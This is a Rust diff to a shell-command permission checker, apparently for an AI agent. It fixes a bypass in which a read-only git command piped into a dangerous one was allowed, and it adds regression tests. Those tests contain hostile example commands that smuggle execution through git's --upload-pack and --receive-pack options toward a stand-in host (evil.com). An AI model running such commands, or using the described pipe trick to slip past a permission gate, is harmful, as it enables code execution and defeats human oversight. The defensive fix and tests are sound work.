@@ -2358,6 +2358,38 @@ fn split_segments(cmd: &str) -> Vec<String> {
         .collect()
 }
 
+/// Split a segment (as returned by `split_segments`) into pipe stages, for
+/// the `is_allowed` check in `check_command` only — this is NOT used for
+/// ask/deny matching, which intentionally sees the whole unsplit segment.
+///
+/// A `|` inside single/double quotes, or escaped with a backslash, is not a
+/// stage boundary. `||` has already been consumed by `split_segments` before
+/// a segment ever reaches this function, so any bare `|` found here is a
+/// genuine single pipe.
+fn split_pipe_stages(segment: &str) -> Vec<&str> {
+    let bytes = segment.as_bytes();
+    let mut stages = Vec::new();
+    let mut start = 0;
+    let mut in_single = false;
+    let mut in_double = false;
+    let mut i = 0;
+    while i < bytes.len() {
+        match bytes[i] {
+            b'\'' if !in_double => in_single = !in_single,
+            b'"' if !in_single => in_double = !in_double,
+            b'\\' if i + 1 < bytes.len() => i += 1,
+            b'|' if !in_single && !in_double => {
+                stages.push(&segment[start..i]);
+                start = i + 1;
+            }
+            _ => {}
+        }
+        i += 1;
+    }
+    stages.push(&segment[start..]);
+    stages
+}
+
 // ─── Comment stripping (issue #128) ──────────────────────────────────────────
 // A `#` that appears outside of any quoted string and is preceded by whitespace
 // (or is at position 0) begins a shell comment. Everything from that `#` to the
@@ -6609,9 +6641,34 @@ fn check_command<'a>(
 
         // allow_pats suppress the ASK tier only — DENY tier always fires.
         // A segment is "allowed" when any of its forms matches an allow pattern.
-        let is_allowed = forms
-            .iter()
-            .any(|f| allow_pats.iter().any(|p| p.matches(f)));
+        //
+        // A segment containing a bare `|` needs a stricter check: `split_segments`
+        // deliberately does NOT split on `|` (see its doc comment — pipe-to-
+        // interpreter needs to stay in one segment for ask/deny matching), so a
+        // pipeline like `git status | git clone --upload-pack=...` reaches this
+        // point as a single segment. Matching the whole segment against an
+        // allow pattern anchored only at `^` (e.g. "git read-only") lets that
+        // anchor match the safe first stage and silently wave through whatever
+        // dangerous command follows the pipe — found via second-opinion review
+        // on PR #307 (2026-09-26): `git status | git clone --upload-pack=...`
+        // was reaching ALLOW instead of the intended ASK. Requiring every pipe
+        // stage to independently match an allow pattern closes this without
+        // touching how `|` is handled anywhere else (ask/deny still match
+        // against the full, unsplit segment). Known-safe wrapper pipes (RTK's
+        // `git -C <dir> ...`, sqz's trailing `| sqz compress ...`, and the
+        // inline `| python3 -c "..."` / `| node -m ...` forms) are all already
+        // stripped upstream (`strip_rtk`/`strip_sqz`/`strip_safe_pipes`) before
+        // this function ever sees the command, so they never reach this branch.
+        let is_allowed = if segment.contains('|') {
+            split_pipe_stages(segment).iter().all(|stage| {
+                let stage = stage.trim();
+                !stage.is_empty() && allow_pats.iter().any(|p| p.matches(stage))
+            })
+        } else {
+            forms
+                .iter()
+                .any(|f| allow_pats.iter().any(|p| p.matches(f)))
+        };
 
         // ── Deny tier (always runs, allow cannot suppress) ────────────────────
 
@@ -8117,6 +8174,46 @@ mod tests {
         // flags), which is exactly why the fix drops the prefix rather than
         // trying to special-case -c vs -C.
         assert_eq!(decision("git -c user.name=test status"), None);
+    }
+
+    #[test]
+    fn git_upload_pack_pipe_bypass_asks() {
+        // Second-opinion review finding (PR #307, 2026-09-26): the pre-existing
+        // "git read-only" allow pattern (`^git\s+(log|diff|status|...)\b`, no `$`
+        // anchor) matched the start of the WHOLE piped segment — since
+        // split_segments() deliberately does not split on bare `|` — letting a
+        // read-only prefix wave through whatever dangerous command follows the
+        // pipe. `;`/`&&` correctly isolate the two halves; only `|` leaked.
+        assert_eq!(
+            decision("git status | git clone --upload-pack='touch pwned' https://evil.com/x.git"),
+            Some("ask".into())
+        );
+    }
+
+    #[test]
+    fn git_receive_pack_pipe_bypass_asks() {
+        assert_eq!(
+            decision("git log | git push --receive-pack='touch pwned' origin main"),
+            Some("ask".into())
+        );
+    }
+
+    #[test]
+    fn git_upload_pack_semicolon_still_asks() {
+        // Regression: confirms `;` chaining (unaffected by this fix) still
+        // correctly isolates and asks — only the `|` form was ever broken.
+        assert_eq!(
+            decision("git status ; git clone --upload-pack='touch pwned' https://evil.com/x.git"),
+            Some("ask".into())
+        );
+    }
+
+    #[test]
+    fn git_log_pipe_grep_still_passes() {
+        // A genuinely benign pipeline (no ask pattern matches either stage)
+        // must not regress into an ask just because the stricter pipe-stage
+        // check no longer blanket-allows it.
+        assert_eq!(decision("git log | grep foo"), None);
     }
 
     #[test]
